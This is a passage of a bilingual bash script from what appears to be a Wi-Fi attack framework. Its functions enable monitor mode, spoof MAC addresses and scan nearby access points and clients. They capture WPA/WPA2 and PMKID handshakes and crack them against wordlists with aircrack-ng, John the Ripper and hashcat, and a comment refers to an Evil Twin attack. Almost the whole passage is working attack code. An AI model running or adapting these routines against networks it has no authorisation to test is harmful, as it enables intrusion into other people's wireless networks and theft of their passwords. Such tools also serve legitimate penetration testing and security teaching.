\"$(check_pmkid_handshake)\" == \"false\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      good_output \"+\" \"$(check_handshake) WPA/WPA2 handshakes captured\"\n    else\n      good_output \"+\" \"$(check_handshake) handshakes WPA capturados\"\n    fi\n  elif [ \"$(check_handshake)\" -le \"0\" ] && [ \"$(check_pmkid_handshake)\" == \"true\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      good_output \"*\" \"No WPA handshake was captured but a PMKID handshake was captured\"\n    else\n      good_output \"*\" \"No se capturó ningún handshake WPA pero sí se capturó un handshake PMKID\"\n    fi\n  elif [ \"$(check_handshake)\" -gt \"0\" ] && [ \"$(check_pmkid_handshake)\" == \"true\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      good_output \"+\" \"$(check_handshake) WPA handshake captured, PMKID handshake have been captured too\"\n    else\n      good_output \"+\" \"$(check_handshake) handshakes WPA capturados, el handshake PMKID ha sido capturados también\"\n    fi\n  elif [ \"$(check_handshake)\" -le \"0\" ] && [ \"$(check_pmkid_handshake)\" == \"false\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output \"*\" \"Neither WPA/WPA2 nor PMKID handshakes were captured\"\n    else\n      color_output \"*\" \"Ningún handshake WPA/WPA2 ni PMKID ha sido capturado\"\n    fi\n  fi\n}\n\nfunction print_available_handshakes(){\n  target=\"$(echo \"1\" | aircrack-ng \"${1}\" | grep \"WPA\")\"\n\n  if [ \"$(echo \"${target}\" | wc -l)\" -gt 1 ]; then\n    echo -e \"\\n${target}\" | sed 's/^....//'\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      good_output_ln \"+\" \"File contains $(check_handshakes_in_file \"${1}\") WPA handshakes\"\n\n      if [ \"$(echo \"1\" | aircrack-ng \"${1}\" | grep \"WPA\" | grep \"PMKID\")\" ]; then\n        good_output \"+\" \"File contains at least one PMKID handshake\"\n      else\n        good_output \"+\" \"File doesn't contain a PMKID handshake\"\n      fi\n    else\n      good_output_ln \"+\" \"El archivo contiene $(check_handshakes_in_file \"${1}\") handshakes WPA\"\n\n      if [ \"$(echo \"1\" | aircrack-ng \"${1}\" | grep \"WPA\" | grep \"PMKID\")\" ]; then\n        good_output \"+\" \"El archivo contiene al menos un handshake PMKID\"\n      else\n        good_output \"+\" \"El archivo no contiene ningún handshake PMKID\"\n      fi\n    fi\n  fi\n}\n\nfunction create_graph(){\n  if [ ! -d \"/usr/share/wef/main/graphs\" ]; then\n    mkdir \"/usr/share/wef/main/graphs\"\n  fi\n\n  if [ \"${create_graph}\" == \"true\" ] && [ \"$(command -v airgraph-ng)\" ]; then\n    airgraph-ng -g CAPR -i \"${1}\" -o \"${2}\" &>/dev/null &\n    sleep 0.2\n\n    if [ \"$lang\" == \"en\" ]; then\n      color_output \"*\" \"Graph saved as ${2}\"\n    else\n      color_output \"*\" \"Gráfico guardado como ${2}\"\n    fi\n  fi\n}\n\nfunction check_and_create(){\n  if [ ! -d \"${1}\" ]; then\n    mkdir \"${1}\" 2>/dev/null\n  fi\n}\n\nfunction move_capture_files(){\n  # Remove useless files\n  rm \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.log.csv\"\n  rm \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.kismet.csv\"\n  rm \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.kismet.netxml\"\n\n  # Rename main .csv and .cap file\n  mv \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.csv\" \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.csv\"\n  mv \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}-01.cap\" \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\"\n}\n\n# Sets some important variables to \"\" (empty) to avoid errors and more\nfunction reset_info(){\n  channel=\"\"\n  essid=\"\"\n  attack_time=\"\"\n  frames_to_send=\"\"\n  ap_bssid=\"\"\n  catch_handshakes=\"\"\n  log_name=\"\"\n  c_h=\"\"\n  crack_option=\"\"\n  wordlist_to_use=\"\"\n  cap_name=\"\"\n  number=\"\"\n  client_number=\"\"\n  ctrl_c_pressed=\"\"\n  ap_dir=\"\"\n}\n\nfunction list_interfaces(){\n  color_output_ln \"*\" \"Interfaces:\"\n  for i in /sys/class/net/*; do\n    echo -e \"\\t${grayC}$(echo \"${i}\" | awk '{print $NF}' FS=\"/\")${endC}\"\n  done\n}\n\n#\n# Functions related to network interface info (MAC, mode, frequencies...) and enabling/disabling monitor mode\n#\n\n# Check if interface is in managed or monitor mode\nfunction print_interface_mode(){\n  status_card=$(check_interface_mode)\n  # Check if the network adapter is in monitor mode or not\n  if [ \"${status_card}\" == \"monitor\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      good_output \"+\" \"Interface mode: ${greenC}monitor\"\n    else\n      good_output \"+\" \"Modo de la interfaz: ${greenC}monitor\"\n    fi\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      good_output \"+\" \"Interface mode: ${grayC}managed\"\n    else\n      good_output \"+\" \"Modo de la interfaz: ${grayC}managed\"\n    fi\n  fi\n}\n\n# Print interface name, use green color for monitor mode and gray for managed mode\nfunction print_interface_name(){\n  if [ -d \"/sys/class/net/${netCard}\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n        good_output_ln \"+\" \"Interface name: ${greenC}${netCard}\"\n      else\n        good_output_ln \"+\" \"Interface name: ${grayC}${netCard}\"\n      fi\n\n    else\n      if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n        good_output_ln \"+\" \"Nombre de la interfaz: ${greenC}${netCard}\"\n      else\n        good_output_ln \"+\" \"Nombre de la interfaz: ${grayC}${netCard}\"\n      fi\n    fi\n\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      echo -e \"${blueC}[${yC}!${blueC}] Interface not found${endC}\"\n    else\n      echo -e \"${blueC}[${yC}!${blueC}] Interfaz no encontrada${endC}\"\n    fi\n  fi\n}\n\n# Print MAC address\nfunction print_mac_address(){\n  vendor=\"($(macchanger -s ${netCard} | grep \"Curren\" | awk '{print $2}' FS=\"(\")\" # Get vendor from \"macchanger\" output\n  if [ \"${vendor}\" == \"(unknown)\" ]; then\n    vendor=\"($(macchanger -s ${netCard} | grep \"Perm\" | awk '{print $2}' FS=\"(\")\" # Filter for permanent address if current is unknown\n  fi\n\n  # Check if network interface is active and exists\n  #if [ \"$(ifconfig | grep \"${netCard}\" | awk '{print $1}' | tr -d ':')\" == \"${netCard}\" ] && [ \"$(check_interface_mode)\" != \"monitor\" ]; then\n  if [ \"$(check_interface_mode)\" != \"monitor\" ]; then\n    current_mac=$(iw dev ${netCard} info | grep \"addr\" | awk '{print $2}')\n    if [ \"$lang\" == \"en\" ]; then\n      good_output \"+\" \"MAC address: ${grayC}${current_mac} ${vendor}\"\n    else\n      good_output \"+\" \"Dirección MAC: ${grayC}${current_mac} ${vendor}\"\n    fi\n\n  # Function enters here if the function is called with monitor mode enabled\n  #elif [ \"$(ifconfig | grep \"${netCard}\" | awk '{print $1}' | tr -d ':')\" == \"${netCard}\" ] && [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n  elif [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n    current_mac=$(macchanger -s ${netCard} | grep \"Curr\" | awk '{print $3}' | tr '[:lower:]' '[:upper:]')\n    if [ \"$lang\" == \"en\" ]; then\n      good_output \"+\" \"MAC address: ${greenC}${current_mac} ${vendor}\"\n    else\n      good_output \"+\" \"Dirección MAC: ${greenC}${current_mac} ${vendor}\"\n    fi\n\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      color_output \"X\" \"An error has ocurred while getting MAC address\\n\"\n    else\n      color_output \"X\" \"Ha ocurrido un error al obtener la dirección MAC\\n\"\n    fi\n    ctrl_c\n  fi \n}\n\n# Print interface frequencies band (2.4GHz, 5GHz or both)\nfunction print_freq_band(){\n  out=$(iw list | grep -A 10 'Frequencies:')\n\n  if [ \"$lang\" == \"en\" ]; then\n    if [ \"$(echo ${out} | grep \"\\[6\\]\")\" ] && [ ! \"$(echo ${out} | grep \"\\[36\\]\")\" ]; then\n\n      if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n        good_output \"+\" \"Frequency: ${greenC}2.4GHz\"\n      else  \n        good_output \"+\" \"Frequency: ${grayC}2.4GHz\"\n      fi\n\n    elif [ \"$(echo ${out} | grep \"\\[6\\]\")\" ] && [ \"$(echo ${out} | grep \"\\[36\\]\")\" ]; then\n      if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n        good_output \"+\" \"Frequencies: ${greenC}2.4GHz and 5GHz\"\n      else\n        good_output \"+\" \"Frequencies: ${grayC}2.4GHz and 5GHz\"\n      fi\n\n    else\n      if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n        good_output \"+\" \"Frequency: ${greenC}5GHz\"\n      else\n        good_output \"+\" \"Frequency: ${grayC}5GHz\"\n      fi\n    fi\n\n  else\n    if [ \"$(echo ${out} | grep \"\\[6\\]\")\" ] && [ ! \"$(echo ${out} | grep \"\\[36\\]\")\" ]; then\n      if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n        good_output \"+\" \"Frecuencia: ${greenC}2.4GHz\"\n      else\n        good_output \"+\" \"Frecuencia: ${grayC}2.4GHz\"\n      fi\n\n    elif [ \"$(echo ${out} | grep \"\\[6\\]\")\" ] && [ \"$(echo ${out} | grep \"\\[36\\]\")\" ]; then\n      if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n        good_output \"+\" \"Frecuencias: ${greenC}2.4GHz y 5GHz\"\n      else\n        good_output \"+\" \"Frecuencias: ${grayC}2.4GHz y 5GHz\"\n      fi\n\n    else\n      if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n        good_output \"+\" \"Frecuencia: ${greenC}5GHz\"\n      else\n        good_output \"+\" \"Frecuencia: ${grayC}5GHz\"\n      fi\n    fi\n  fi\n}\n\n# Enable monitor mode\nfunction enable_mon(){\n  # Function enters here if you haven't enabled monitor mode\n  if [ \"$(check_interface_mode)\" != \"monitor\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Configuring network adapter interface (${netCard})...\"\n    else\n      color_output_ln \"*\" \"Configurando la interfaz de la tarjeta de red (${netCard})...\"\n    fi\n\n    if [ \"${airmon_check_kill}\" == \"true\" ]; then\n      airmon-ng check kill &>/dev/null\n    fi\n\n    # Enable monitor mode\n    mon_output=\"$(airmon-ng start ${netCard})\"\n    oldCard=\"$(echo \"${mon_output}\" | grep \"station mode vif disabled\" | awk '{print $NF}' FS=\"]\" | tr -d \")\")\"\n    netCard=\"$(echo \"${mon_output}\" | grep \"monitor mode vif enabled\" | awk '{print $NF}' FS=\"]\" | tr -d \")\")\"\n    evilCard=\"${oldCard}\"\n    ip link set \"${netCard}\" up 2>/dev/null\n    export netCard oldCard evilCard # Used on Evil Twin attack\n\n    if [ \"$lang\" == \"en\" ]; then\n      good_output \"+\" \"Interface configured successfully\"\n    else\n      good_output \"+\" \"Interfaz configurada correctamente\"\n    fi\n\n    if [ \"$oldCard\" != \"$netCard\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        press_enter \"Interface name has changed from $oldCard to ${netCard}, press [Enter] to continue \"\n      else\n        press_enter \"El nombre de la interfaz ha cambiado de $oldCard a ${netCard}, presiona [Enter] para continuar \"\n      fi\n    fi\n\n    # Workaround for some weird interfaces which change its name radically after enabling monitor mode\n    if [ ! -d \"/sys/class/net/${netCard}\" ] && [ ! -d \"/sys/class/net/${netCard}mon\" ]; then\n      ask_new_name\n    fi\n  fi\n}\n\n# Disable monitor mode and enable managed mode\nfunction disable_mon(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"*\" \"Configuring interface...\"\n  else\n    color_output_ln \"*\" \"Configurando la interfaz...\"\n  fi\n\n  airmon-ng stop ${netCard} &>/dev/null\n  ip link set ${oldCard} up 2>/dev/null\n  netCard=${oldCard}\n}\n\n# Change MAC address\nfunction randomize_mac(){\n  # Turn off the interface\n  ip link set ${netCard} down 2>/dev/null\n\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"MAC address to replace the current one with (default=random): \" && read mac_to_change\n  else\n    color_output_no_line \"*\" \"Dirección MAC con la que remplazar la actual (por defecto=random): \" && read mac_to_change\n  fi\n\n  if [ ! \"${mac_to_change}\" ]; then\n    # Randomize the mac address\n    macchanger -a ${netCard} &>/dev/null\n  else\n    macchanger -m ${mac_to_change} ${netCard} &>/dev/null\n  fi\n\n  if [ \"$lang\" == \"en\" ]; then\n    good_output \"+\" \"MAC address changed successfully\"\n  else\n    good_output \"+\" \"Dirección MAC cambiada correctamente\"\n  fi\n\n  # Activate again the interface\n  ip link set ${netCard} up 2>/dev/null\n}\n\n\n\n\n#\n# Handshake related functions\n#\n\nfunction select_cracking_method(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"+\" \"Available cracking methods:\"\n    echo -ne \"\\t\"; color_output_no_line \"1\" \"aircrack-ng\\n\"\n    echo -ne \"\\t\"; color_output_no_line \"2\" \"john the ripper\\n\"\n    echo -ne \"\\t\"; color_output_no_line \"3\" \"hashcat\\n\\n\"\n  else\n    color_output_ln \"+\" \"Métodos para crackear los handshakes disponibles:\"\n    echo -ne \"\\t\"; color_output_no_line \"1\" \"aircrack-ng\\n\"\n    echo -ne \"\\t\"; color_output_no_line \"2\" \"john the ripper\\n\"\n    echo -ne \"\\t\"; color_output_no_line \"3\" \"hashcat\\n\\n\"\n  fi\n\n  while true; do\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_no_line \"*\" \"Select an option: \" && read crack_option\n    else\n      color_output_no_line \"*\" \"Selecciona una opción: \" && read crack_option\n    fi\n\n    if [ \"$crack_option\" == \"1\" ]; then\n      crack_handshake_aircrack \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\"\n      break\n    elif [ \"$crack_option\" == \"2\" ]; then\n      john_tools_missing=\"false\"\n      if [ ! \"$(command -v john)\" ]; then\n        log_command_not_found \"john\"\n        john_tools_missing=\"true\"\n      fi\n\n      if [ ! \"$(command -v wpapcap2john)\" ]; then\n        log_command_not_found \"wpapcap2john\"\n        john_tools_missing=\"true\"\n      fi\n\n      if [ \"$john_tools_missing\" != \"true\" ]; then\n        crack_handshake_john \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\"\n        break\n      fi\n\n    elif [ \"$crack_option\" == \"3\" ]; then\n      hashcat_tools_missing=\"false\"\n      if [ ! \"$(command -v hashcat)\" ]; then\n        log_command_not_found \"hashcat\"\n        hashcat_tools_missing=\"true\"\n      fi\n\n      if [ ! \"$(command -v hcxpcapngtool)\" ]; then\n        log_command_not_found \"hcxpcapngtool\"\n        hashcat_tools_missing=\"true\"\n      fi\n\n      if [ \"$hashcat_tools_missing\" != \"true\" ]; then\n        crack_handshake_aircrack \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\"\n        break\n      fi\n    fi\n  done\n}\n\n# Main default cracking function\nfunction crack_handshake(){\n  if [ \"$(check_target_handshakes_in_file \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\")\" -le 0 ] && [ \"$(check_pmkid_handshake)\" != \"true\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"File contains no handshakes\"\n    else\n      color_output_ln \"*\" \"El archivo no contiene handshakes\"\n    fi\n\n    return\n  fi\n\n  trap keep_exit_c INT\n\n  ask_dict\n\n  select_cracking_method\n\n  reset_info\n  keep_exit\n}\n\n# Crack WPA handshake(s) with aircrack-ng\nfunction crack_handshake_aircrack(){\n  if [ -f \"${1}\" ]; then\n    if [ \"$(check_handshakes_in_file \"${1}\")\" -le 0 ] && [ \"$(check_pmkid_handshake)\" != \"true\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_ln \"*\" \"File contains no handshakes\"\n      else\n        color_output_ln \"*\" \"El archivo no contiene handshakes\"\n      fi\n\n      return\n    fi\n\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Press Ctrl+C to stop aircrack-ng\"\n    else\n      color_output_ln \"*\" \"Presiona Ctrl+C para parar aircrack-ng\"\n    fi; sleep 1.5\n\n    trap crack_c INT\n    aircrack-ng -w ${wordlist_to_use} \"${1}\" | tee # use \"tee\" so the command stops with Ctrl+C\n\n    log_cracking_completed\n  else\n    log_handshakes_not_found\n  fi\n\n  reset_info\n}\n\n# Crack WPA handshake(s) with john\nfunction crack_handshake_john(){\n  if [ -f \"${1}\" ]; then\n    if [ \"$(check_handshakes_in_file \"${1}\")\" -le 0 ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_ln \"*\" \"File contains no handshakes\"\n      else\n        color_output_ln \"*\" \"El archivo no contiene handshakes\"\n      fi\n\n      return\n    fi\n\n    rm /usr/share/wef/cache/handshake.jtr 2>/dev/null\n\n    trap crack_c INT\n    wpapcap2john \"${1}\" > \"/usr/share/wef/cache/handshake.jtr\" 2>/dev/null\n    sleep 0.5\n\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Press Ctrl+C to stop JTR\"\n    else\n      color_output_ln \"*\" \"Presiona Ctrl+C para parar JTR\"\n    fi\n\n    john --wordlist=\"${wordlist_to_use}\" \"/usr/share/wef/cache/handshake.jtr\"\n    echo\n\n    log_cracking_completed\n  else\n    log_handshakes_not_found\n  fi\n\n  reset_info\n}\n\n# Crack WPA handshake(s) with hashcat\nfunction crack_handshake_hashcat(){\n  if [ -f \"${1}\" ]; then\n\n    if [ \"$(file \"${1}\" | grep \"cap capture file\")\" ]; then\n      if [ \"$(check_handshakes_in_file \"${1}\")\" -le 0 ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_ln \"*\" \"File contains no handshakes\"\n        else\n          color_output_ln \"*\" \"El archivo no contiene handshakes\"\n        fi\n\n        return\n      fi\n\n      rm /usr/share/wef/cache/hashcat_hashes.txt 2>/dev/null\n\n      # Convert hashes to readable hashcat format\n      hcxpcapngtool -o \"/usr/share/wef/cache/hashcat_hashes.txt\" \"${1}\" &>/dev/null\n\n      if [ -f \"/usr/share/wef/cache/hashcat_hashes.txt\" ] && [ \"$(wc -l \"/usr/share/wef/cache/hashcat_hashes.txt\" | awk '{print $1}')\" != \"0\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_ln \"*\" \"Press Ctrl+C to stop hashcat\"\n        else\n          color_output_ln \"*\" \"Presiona Ctrl+C para parar hashcat\"\n        fi\n\n        # Crack hashes with hashcat\n        hashcat -m 22000 \"/usr/share/wef/cache/hashcat_hashes.txt\" \"${wordlist_to_use}\"\n        echo\n\n        log_cracking_completed\n      else\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_ln \"*\" \"No handshakes available to crack\"\n        else\n          color_output_ln \"*\" \"No hay handshakes disponibles para crackear\"\n        fi\n      fi\n    elif [ \"$(file \"${1}\" | grep \"ASCII text\")\" ]; then\n      if [ \"$(wc -l \"${1}\" | awk '{print $1}')\" != \"0\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_ln \"*\" \"Press Ctrl+C to stop hashcat\"\n        else\n          color_output_ln \"*\" \"Presiona Ctrl+C para parar hashcat\"\n        fi\n\n        # Crack hashes with hashcat\n        hashcat -m 22000 \"${1}\" \"${wordlist_to_use}\"\n        echo\n\n        log_cracking_completed\n      else\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_ln \"*\" \"No handshakes available to crack\"\n        else\n          color_output_ln \"*\" \"No hay handshakes disponibles para crackear\"\n        fi\n      fi\n    else\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_ln \"*\" \"Invalid handshakes file format\"\n      else\n        color_output_ln \"*\" \"Formato del archivo de handshakes incorrecto\"\n      fi\n    fi\n\n  else\n    log_handshakes_not_found\n  fi\n\n  reset_info\n}\n\n# Crack PMKID handshake with hashcat\nfunction crack_pmkid_handshakes(){\n  if [ -f \"${1}\" ] && [ \"$(wc -l \"${1}\" | awk '{print $1}')\" != \"0\" ]; then\n    trap crack_c INT\n    ask_dict\n\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Press Ctrl+C to stop hashcat\"\n    else\n      color_output_ln \"*\" \"Presiona Ctrl+C para parar hashcat\"\n    fi; sleep 1.5\n\n    hashcat -m 22000 \"${1}\" \"${wordlist_to_use}\" -d 1\n\n    echo\n    log_cracking_completed\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"No PMKID handshakes found\"\n    else\n      color_output_ln \"*\" \"No se han encontrado handshakes PMKID\"\n    fi\n  fi\n\n  reset_info\n  keep_exit\n}\n\nfunction crack_ivs(){\n  if [ -f \"${1}\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Press Ctrl+C to stop aircrack-ng\"\n    else\n      color_output_ln \"*\" \"Presiona Ctrl+C para parar aircrack-ng\"\n    fi; sleep 1.5\n\n    trap crack_c INT\n    aircrack-ng \"${1}\" | tee # use \"tee\" so the command stops with Ctrl+C\n\n    log_cracking_completed\n  fi\n\n  reset_info\n}\n\n\n#\n# Access Points related functions\n#\n\nfunction scan_aps(){\n  if [ ! -f \"/usr/share/wef/cache/airodump-01.csv\" ] || [ \"$scan_on_each_attack\" == \"true\" ]; then # Check if an AP scan already exists\n    if [ \"$airmon_check_kill\" != \"true\" ]; then # If using in headless, stop scanning with Ctrl+C\n      trap ctrl_c_pressed=true INT\n      if [ \"$lang\" == \"en\" ]; then\n        press_enter \"Press [Enter] to start scanning APs, then press Ctrl+C to stop \"\n      else\n        press_enter \"Presiona [Enter] para empezar a escanear APs, después presiona Ctrl+C para parar \"\n      fi; sleep 1\n    fi\n\n    launch_scan\n    \n    if [ \"$airmon_check_kill\" == \"true\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        press_enter \"Press [Enter] to stop scanning APs and continue \"\n      else\n        press_enter \"Presiona [Enter] para dejar de escanear APs y continuar \"\n      fi; sleep 1\n    elif [ \"$airmon_check_kill\" == \"false\" ]; then # If using in headless, keep refreshing APs info until Ctrl+C is pressed\n      sleep 0.5\n      while true; do\n        if [ ! \"$ctrl_c_pressed\" ]; then\n          format_csv_info\n          sleep 1\n          clear\n        else\n          break\n        fi\n      done\n    fi\n\n    if [ \"$airmon_check_kill\" != \"true\" ]; then\n      clear\n      trap keep_exit_c INT\n    fi\n\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null # Kill airodump process\n\n    sleep 0.15; echo\n    format_csv_info\n\n  else # If AP scan exists and 'scan_on_each_attack' is set to false, read and format CSV content\n    format_csv_info\n  fi\n\n  trap keep_exit_c INT\n}\n\nfunction launch_scan(){\n  if [ ! \"${frequency_band}\" ]; then\n    frequency_band=\"2.4\"\n  fi\n\n  rm /usr/share/wef/cache/airodump-* 2>/dev/null\n\n  if [ \"$airmon_check_kill\" == \"true\" ]; then\n    xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry 107x36-10+10 -T \"Airodump-ng\" -xrm 'XTerm*selectToClipboard: true' -e \"airodump-ng -w \\\"/usr/share/wef/cache/airodump\\\" --output-format csv --band ${band} ${netCard}\" 2>/dev/null &\n  else\n    airodump-ng -w \"/usr/share/wef/cache/airodump\" --output-format csv --band ${band} ${netCard} &>/dev/null &\n  fi\n\n  airodump_PID=$!\n}\n\nfunction format_csv_info(){\n  if [ -f \"/usr/share/wef/cache/airodump-01.csv\" ]; then\n    # Access Points\n    aps_headers=\"$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | head -n 1)\"\n\n    aps=\"$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)\"\n\n    # Stations\n    stations_headers=\"$(cat /usr/share/wef/cache/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | head -n 1)\"\n\n    stations=\"$(cat /usr/share/wef/cache/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7- -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)\"\n\n    if [ \"${aps_headers}\" ] && [ \"${aps}\" ]; then\n      # Print info\n      echo -e \"${yC}Number   ${aps_headers}${endC}\"\n\n      counter=$((0))\n      while read -r line; do\n        counter=$((counter+1))\n\n        if [[ $counter -lt 10 ]]; then\n          echo -e \"${yC}$counter${grayC})       ${line}${endC}\"\n        else\n          echo -e \"${yC}$counter${grayC})      ${line}${endC}\"\n        fi\n      done <<< \"${aps}\"\n\n      if [ \"${stations}\" ]; then\n        if [ \"$identify_devices\" == \"false\" ]; then\n          echo -e \"\\n${yC}${stations_headers}${endC}\"\n        elif [ \"$identify_devices\" == \"true\" ] && [ \"${stations}\" ] && [ \"$airmon_check_kill\" == \"true\" ]; then\n          echo -e \"\\n${yC}${stations_headers}               Station Vendor${endC}\"\n        elif [ \"$identify_devices\" == \"true\" ] && [ \"${stations}\" ] && [ \"$airmon_check_kill\" == \"false\" ] && [ \"$ctrl_c_pressed\" ]; then\n          echo -e \"\\n${yC}${stations_headers}               Station Vendor${endC}\"\n        else\n          echo -e \"\\n${yC}${stations_headers}${endC}\"\n        fi\n\n        if [ \"${identify_devices}\" == \"true\" ] && [ \"${stations}\" ] && [ \"$airmon_check_kill\" == \"true\" ]; then\n          while read -r line; do\n            station_mac=\"$(echo \"${line}\" | awk '{print $1}')\"\n\n            vendor=\"$(get_vendor_from_mac \"${station_mac}\")\"\n\n            if [ \"${vendor}\" ]; then\n              if [ \"$(echo \"${line}\" | awk '{print $NF}')\" == \"associated)\" ]; then\n                echo -e \"${grayC}${line}    (${vendor})${endC}\"\n              else\n                echo -e \"${grayC}${line}   (${vendor})${endC}\"\n              fi\n            else\n              echo -e \"${grayC}${line}${endC}\"\n            fi\n          done <<< \"${stations}\"\n        elif [ \"$identify_devices\" == \"true\" ] && [ \"${stations}\" ] && [ \"$airmon_check_kill\" == \"false\" ] && [ \"$ctrl_c_pressed\" ]; then\n          while read -r line; do\n            station_mac=\"$(echo \"${line}\" | awk '{print $1}')\"\n\n            vendor=\"$(get_vendor_from_mac \"${station_mac}\")\"\n\n            if [ \"${vendor}\" ]; then\n              if [ \"$(echo \"${line}\" | awk '{print $NF}')\" == \"associated)\" ]; then\n                echo -e \"${grayC}${line}    (${vendor})${endC}\"\n              else\n                echo -e \"${grayC}${line}   (${vendor})${endC}\"\n              fi\n            else\n              echo -e \"${grayC}${line}${endC}\"\n            fi\n          done <<< \"${stations}\"\n        else\n          echo -e \"${grayC}${stations}${endC}\"\n        fi\n      fi\n    fi\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"No recent APs scan found\"\n    else\n      color_output_ln \"*\" \"No se ha encontrado ningun escaneo de APs reciente\"\n    fi\n  fi\n}\n\nfunction format_csv_clients_info(){\n  if [ -f \"/usr/share/wef/cache/airodump-devices-01.csv\" ]; then\n    # Stations\n    stations_headers=\"$(cat \"/usr/share/wef/cache/airodump-devices-01.csv\" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | head -n 1)\"\n\n    stations=\"$(cat \"/usr/share/wef/cache/airodump-devices-01.csv\" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | tail -n +2)\"\n\n    echo -e \"${yC}Number   ${stations_headers}${endC}\"\n\n    counter=$((0))\n    while read -r line; do\n      counter=$((counter+1))\n\n      if [ \"${identify_devices}\" == \"true\" ]; then\n        station_mac=\"$(echo \"${line}\" | awk '{print $1}')\"\n\n        vendor=\"$(get_vendor_from_mac \"${station_mac}\")\"\n\n        if [ \"${vendor}\" ]; then\n          if [[ $counter -lt 10 ]]; then\n            echo -e \"${yC}${counter}${grayC})       ${line}  (${vendor})${endC}\"\n          else\n            echo -e \"${yC}${counter}${grayC})      ${line}  (${vendor})${endC}\"\n          fi\n        else\n          if [[ $counter -lt 10 ]]; then\n            echo -e \"${yC}${counter}${grayC})       ${line}${endC}\"\n          else\n            echo -e \"${yC}${counter}${grayC})      ${line}${endC}\"\n          fi\n        fi\n      else\n        if [[ $counter -lt 10 ]]; then\n          echo -e \"${yC}${counter}${grayC})       ${line}${endC}\"\n        else\n          echo -e \"${yC}${counter}${grayC})      ${line}${endC}\"\n        fi\n      fi\n    done <<< \"${stations}\"\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"No recent APs scan found\"\n    else\n      color_output_ln \"*\" \"No se ha encontrado ningun escaneo de APs reciente\"\n    fi\n  fi\n}\n\n# Used to scan access points for WPS purposes\nfunction scan_aps_wps(){\n  trap wash_c INT\n\n  if [ ! \"${frequency_band}\" ]; then\n    frequency_band=\"2.4\"\n  fi\n\n  if [ \"${band}\" == \"g\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Scanning nearby 2.4GHz access points, press Ctrl+C to stop and continue...\\n\"\n    else\n      color_output_ln \"*\" \"Escaneando 